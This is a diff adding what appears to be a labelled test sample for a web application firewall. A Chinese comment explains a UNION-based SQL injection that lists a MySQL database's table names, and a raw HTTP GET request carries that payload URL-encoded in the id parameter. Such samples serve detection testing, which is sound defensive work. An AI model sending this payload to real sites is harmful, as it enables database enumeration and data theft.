@@ -1,0 +1,9 @@
+# SQL注入_GET_mysql_普通注入-06506218
+# 攻击者基于UNION查询，将"union select concat_ws(0x23,table_name) from information_schema.tables where table_schema=database()"语句注入到 SQL 查询参数中，目的是获取数据库中所有表名。通过获取数据库中所有表名称信息，从而进一步对数据库进行恶意操作，比如篡改用户信息、窃取敏感数据等。
+GET /?id=1%20union%20select%20concat_ws%280x23%2Ctable_name%29%20from%20information_schema.tables%20where%20table_schema=database%28%29&bid=hd_tag_m8mv24ft HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv24ft
+RM-PRO-Token: 1ef80696af0861b0aae8972daac7a16d
+RM-PRO-Time: 1742808380373
+User-Agent: curl/7.83.1
+
